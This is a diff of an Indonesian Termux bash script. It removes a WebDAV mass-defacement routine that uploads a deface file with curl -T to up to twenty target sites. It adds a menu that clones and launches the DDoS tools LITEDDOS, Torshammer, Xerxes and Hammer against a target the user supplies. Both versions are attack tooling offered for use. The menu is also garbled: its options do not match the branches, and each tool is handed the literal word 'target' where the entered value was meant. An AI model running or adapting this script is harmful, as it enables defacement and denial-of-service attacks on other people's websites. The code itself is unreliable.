@@ -1,3 +1,12 @@
+#!/system/xbin/bash
+#Author InYourDfv47
+#Thanks to
+#Termux Termux Tools-ID
+#Elite Muslim Cyber Army
+#Netral Cyber Team
+#2Easy 4Hack
+
+clear
 blue='\033[34;1m'
 green='\033[32;1m'  
 purple='\033[35;1m'
@@ -5,13 +14,62 @@ cyan='\033[36;1m'
 red='\033[31;1m'
 white='\033[37;1m'                                           
 yellow='\033[33;1m'
+NOW=`date "+%d.%m.%Y"`
+TIME=`date "+%H:%M"`
 
-toilet -f standard " Bahauddin " -F gay
+echo
+toilet -f standard " InYourDfv47 " -F gay
+echo
+echo ""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo $green""
+echo $yellow""
+echo $red""
+echo $white""
+echo $purple" "
+echo $cyan"" 
+echo $green""
+echo $yellow""
+echo $red""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo ""
+echo $white".:Ini Adalah Tools Installer Yang Dibuat Oleh InYourDfv47:."
+echo $purple"...........::::::::::Karya Anak Bangsa::::::::::..........."
+echo $cyan".::Bermimpi lah Setinggi Langit Karena Mimpi itu Gratis:.."
+echo $green"......::::::Silahkan Pilih Tools Yang Tersedia:::::::......"
+echo $yellow
+date 
+echo "\033[36;1m"
+echo "[+]===============================================[+]"
+echo $red"|  [1] Materi Hacking Ala InYourDfv47               |"
+echo "[+]===============================================[+]"
+echo $white"|  [2] DDOS Website Dengan LITEDDOS                 |"
+echo "[+]===============================================[+]"
+echo $purple"|  [3] DDOS Website Dengan Torshammer               |"
+echo "[+]===============================================[+]"
+echo $cyan"|  [4] DDOS Website Dengan Xerxes                   |"
+echo "[+]===============================================[+]"
+echo $purple"|  [00] About Me                                    |"
+echo "[+]===============================================[+]"
+echo $cyan"|  [0] Exit                                         |"
+echo "[+]===============================================[+]"
+echo
+echo "\033[32;1m"
+read -p "╭─[Pilih Nomer]
+╰─root@Dfv47=•>" bro
+
+
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo
+toilet -f standard " InYourDfv47 " -F gay
 echo
 echo ""
 echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
 echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
-echo $yellow"|  [Version     ]: Deface Multi Brute Webdav  °       °  |"
+echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
 echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
 echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
 echo $purple"|  °      °	   [Thanks To All Member]     °          |"
@@ -21,121 +79,106 @@ echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
 echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
 echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
 sleep 1
-echo
-echo $red"-======== <|| TOOLS DEFACE WEBDAV ||> ========-"
-echo
-echo $white"<|| SIAP DI ECXECUSI MAS BRO ||>"
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno nama scrip defacemu cok"
-read -p "[*******>" script
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer1 "
-read -p "[*******>" Deface1
-curl -T /storage/emulated/0/$script $Deface1
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer2 "
-read -p "[*******>" Deface2
-curl -T /storage/emulated/0/$script $Deface2
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer3"
-read -p "[*******>" Deface3
-curl -T /storage/emulated/0/$script $Deface3
-echo $red"<||>****************************************************<||>"
-echo $white" Masukno target nomer4"
-read -p "[*******>" Deface4
-curl -T /storage/emulated/0/$script $Deface4
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer5"
-read -p "[*******>" Deface5
-curl -T /storage/emulated/0/$script $Deface5
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer6"
-read -p "[*******>" Deface6
-curl -T /storage/emulated/0/$script $Deface6
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer7"
-read -p "[*******>" Deface7
-curl -T /storage/emulated/0/$script $Deface7
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer8"
-read -p "[*******>" Deface8
-curl -T /storage/emulated/0/$script $Deface8
-echo $red"[+]====================================================[+]"
-echo $white"Masukno target nomer9"
-read -p "[*******>" Deface9
-curl -T /storage/emulated/0/$script $Deface9
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer10"
-read -p "[*******>" Deface10
-curl -T /storage/emulated/0/$script $Deface10
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer11"
-read -p "[*******>" Deface11
-curl -T /storage/emulated/0/$script $Deface11
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer12 "
-read -p "[*******>" Deface12
-curl -T /storage/emulated/0/$script $Deface12
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer13"
-read -p "[*******>" Deface13
-curl -T /storage/emulated/0/$script $Deface13
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer14"
-read -p "[*******>" Deface14
-curl -T /storage/emulated/0/$script $Deface14
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer15"
-read -p "[*******>" Deface15
-curl -T /storage/emulated/0/$script $Deface15
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer16"
-read -p "[*******>" Deface16
-curl -T /storage/emulated/0/$script $Deface16
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer17"
-read -p "[*******>" Deface17
-curl -T /storage/emulated/0/$script $Deface17
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer18"
-read -p "[*******>" Deface18
-curl -T /storage/emulated/0/$script $Deface18
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer19"
-read -p "[*******>" Deface19
-curl -T /storage/emulated/0/$script $Deface19
-echo $red"<||>****************************************************<||>"
-echo $white"Masukno target nomer20"
-read -p "[*******>" Deface20
-curl -T /storage/emulated/0/$script $Deface20
-echo $red"<||>****************************************************<||>"
-echo
+echo $green"Installing LITEDDOS..."
 sleep 1
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
 
-echo $red".:: [ NTENI DISE' YO..LAGI PROSSES] ::."
-echo $white
-echo "MONGGO DI CEK WEB E $Deface1/$script"
-echo "MONGGO DI CEK WEB E $Deface2/$script"
-echo "MONGGO DI CEK WEB E $Deface3/$script"
-echo "MONGGO DI CEK WEB E $Deface4/$script"
-echo "MONGGO DI CEK WEB E $Deface5/$script"
-echo "MONGGO DI CEK WEB E $Deface6/$script"
-echo "MONGGO DI CEK WEB E $Deface7/$script"
-echo "MONGGO DI CEK WEB E $Deface8/$script"
-echo "MONGGO DI CEK WEB E $Deface9/$script"
-echo "MONGGO DI CEK WEB E $Deface10/$script"
-echo "MONGGO DI CEK WEB E $Deface11/$script"
-echo "MONGGO DI CEK WEB E $Deface12/$script"
-echo "MONGGO DI CEK WEB E $Deface13/$script"
-echo "MONGGO DI CEK WEB E $Deface14/$script"
-echo "MONGGO DI CEK WEB E $Deface15/$script"
-echo "MONGGO DI CEK WEB E $Deface16/$script"
-echo "MONGGO DI CEK WEB E $Deface17/$script"
-echo "MONGGO DI CEK WEB E $Deface18/$script"
-echo "MONGGO DI CEK WEB E $Deface19/$script"
-echo "MONGGO DI CEK WEB E $Deface20/$script"
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+echo
+toilet -f standard " InYourDfv47 " -F gay
+echo
+echo ""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
+echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
+echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
+echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
+echo $purple"|  °      °	   [Thanks To All Member]     °          |"
+echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
+echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
+echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
+echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+sleep 1
+echo $green"Installing Torshammer DDOS..."
+sleep 1
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
+read -p "Masukan Target:" target
+python2 torshammer.py -T -t target
+fi
 
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+clear
 echo
-echo $white"-=NAK GAGAL BERARTI WEB ORA VULN=-"
+toilet -f standard " InYourDfv47 " -F gay
 echo
-echo $red".::[ Mr.B4h4' Bahauddin bendokaton tayu pati  ]::."
+echo ""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
+echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
+echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
+echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
+echo $purple"|  °      °	   [Thanks To All Member]     °          |"
+echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
+echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
+echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
+echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+sleep 1
+echo $green"Installing Xerxes DDOS..."
+sleep 1
+apt update && apt upgrade
+apt install git
+apt install clang
+git clone https://github.com/zanyarjamal/xerxes
+mv xerxes $HOME
+cd $HOME/xerxes
+clang xerxes.c -o xerxes
+clear
+read -p "[masukanWebsiteTarget]>" target
+./xerxes target 80
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+echo
+toilet -f standard " InYourDfv47 " -F gay
+echo
+echo ""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
+echo $yellow"|  [Version     ]: Tools Installer  °       °      °   ° |"
+echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
+echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
+echo $purple"|  °      °	   [Thanks To All Member]     °          |"
+echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
+echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
+echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
+echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+sleep 1
+echo $green" Installing Hammer DDOS.."
+sleep 1
+git clone https://github.com/cyweb/hammer
+mv hammer $HOME
+cd $HOME/hammer
+read -p "Masukan Target:" target
+python2 hammer.py -T -t target
+fi
+
